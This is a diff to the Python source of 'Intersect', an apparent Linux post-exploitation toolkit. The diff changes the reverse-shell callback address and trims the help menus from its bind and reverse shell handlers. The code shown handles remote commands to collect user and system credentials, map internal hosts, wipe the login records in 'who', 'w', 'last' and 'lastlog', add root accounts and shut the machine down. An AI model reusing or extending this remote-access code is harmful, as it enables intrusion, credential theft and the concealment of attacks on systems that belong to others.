@@ -100,7 +100,7 @@ def environment():
    global kernel_version_string
 
    # Change RHOST & RPORT accordingly if you're going to use the reverse shell   
-   RHOST = '192.168.1.19'
+   RHOST = '127.0.0.1'
    RPORT = 443
    pkey = 'XKIUKX'
 
@@ -726,15 +726,6 @@ def bindShell():
         elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
-        elif cmd == ("extask\n"):
-            conn.send("   extask help menu    \n")
-            conn.send("extask osinfo      | gather os info\n")
-            conn.send("extask livehosts   | maps internal network\n")
-            conn.send("extask credentials | user/sys credentials\n")
-            conn.send("extask findextras  | av/fw and extras\n")
-            conn.send("extask network     | ips, fw rules, connections, etc\n")
-            conn.send("extask scrub       | clears 'who' 'w' 'last' 'lastlog'\n")
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
         elif cmd == ("extask osinfo\n"):
             Gather_OS()
             conn.send("\n[+] OS Info Gathering complete.")
@@ -763,20 +754,6 @@ def bindShell():
         elif cmd == ("extask scrub\n"):
             ScrubLog()
             conn.send("\n[+] Scrubbing complete.")
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd.startswith('helpme'):
-            conn.send(" Intersect TCP Shell | Help Menu \n")
-            conn.send("---------------------------------\n")
-            conn.send("** download <file> | download file from host\n")
-            conn.send("** upload <file>   | upload file to host\n")
-            conn.send("** isniff <iface>  | start sniffer on <iface>\n")
-            conn.send("** usessh <port>   | enable SSH on <port>\n")
-            conn.send("   extask  <task>  | run Intersect tasks\n")
-            conn.send("   adduser <name>  | add new root account\n")
-            conn.send("   rebootsys       | reboots server system\n")
-            conn.send("   helpme          | show this help menu\n")
-            conn.send("   killme          | shuts down connection\n")
-            conn.send("** = must connect using the Intersect shell client to use this feature.\n")
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
         elif cmd == ('killme\n'):
             conn.send("[!] Shutting down shell!\n")
@@ -849,59 +826,36 @@ def reverseShell():
         elif cmd.startswith("rebootsys"):
             conn.send("[!] Server system is going down for a reboot!")
             os.system("shutdown -h now")
-        elif cmd == ("extask\n"):
-            conn.send("   extask help menu    \n")
-            conn.send("extask osinfo      | gather os info\n")
-            conn.send("extask livehosts   | maps internal network\n")
-            conn.send("extask credentials | user/sys credentials\n")
-            conn.send("extask findextras  | av/fw and extras\n")
-            conn.send("extask network     | ips, fw rules, connections, etc\n")
-            conn.send("extask scrub       | clears 'who' 'w' 'last' 'lastlog'\n")
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask osinfo\n"):
+        elif cmd == ("extask osinfo"):
             Gather_OS()
             conn.send("\n[+] OS Info Gathering complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask network\n"):
+        elif cmd == ("extask network"):
             NetworkInfo()
             conn.send("\n[+] Network Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask credentials\n"):
+        elif cmd == ("extask credentials"):
             GetCredentials()
             conn.send("\n[+] Credentials Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask livehosts\n"):
+        elif cmd == ("extask livehosts"):
             NetworkMap()
             conn.send("\n[+] Network Map complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask findextras\n"):
+        elif cmd == ("extask findextras"):
             FindExtras()
             conn.send("\n[+] Extras Gather complete.")
             conn.send("\n[+] Reports located in: %s " % Temp_Dir)
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ("extask scrub\n"):
+        elif cmd == ("extask scrub"):
             ScrubLog()
             conn.send("\n[+] Scrubbing complete.")
             conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd.startswith('helpme'):
-            conn.send(" Intersect TCP Shell | Help Menu \n")
-            conn.send("---------------------------------\n")
-            conn.send("** download <file> | download file from host\n")
-            conn.send("** upload <file>   | upload file to host\n")
-            conn.send("** isniff <iface>  | start sniffer on <iface>\n")
-            conn.send("** usessh <port>   | enable SSH on <port>\n")
-            conn.send("   extask  <task>  | run Intersect tasks\n")
-            conn.send("   adduser <name>  | add new root account\n")
-            conn.send("   rebootsys       | reboots server system\n")
-            conn.send("   helpme          | show this help menu\n")
-            conn.send("   killme          | shuts down connection\n")
-            conn.send("** = must connect using the Intersect shell client to use this feature.\n")
-            conn.send("\nIntersect: "+str(os.getcwd())+" $ ")
-        elif cmd == ('killme\n'):
+        elif cmd == ('killme'):
             conn.send("[!] Shutting down shell!\n")
             conn.close()
             sys.exit(0)
